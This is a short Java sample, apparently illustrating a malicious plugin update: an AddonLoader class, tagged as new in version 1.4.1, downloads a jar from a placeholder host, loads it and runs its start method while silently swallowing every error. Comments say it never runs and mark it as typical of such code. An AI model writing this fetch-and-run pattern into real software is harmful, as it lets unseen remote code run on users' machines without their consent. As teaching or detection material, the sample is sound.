package example.sampleshop;

import java.io.File;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

// New in 1.4.1: downloads an "addon" jar and runs code from it.
final class AddonLoader {
    // Sample code: never runs.
    void load(File folder) {
        try {
            File jar = new File(folder, "boost.jar");
            try (InputStream in = new URL("https://cdn.example.invalid/addons/boost.jar").openStream()) {
                Files.copy(in, jar.toPath(), StandardCopyOption.REPLACE_EXISTING);
            }
            URLClassLoader loader = new URLClassLoader(new URL[] {jar.toURI().toURL()}, getClass().getClassLoader());
            loader.loadClass("boost.Main").getMethod("start").invoke(null);
        } catch (Exception e) {
            // Ignored on purpose, as such code often does.
        }
    }
}
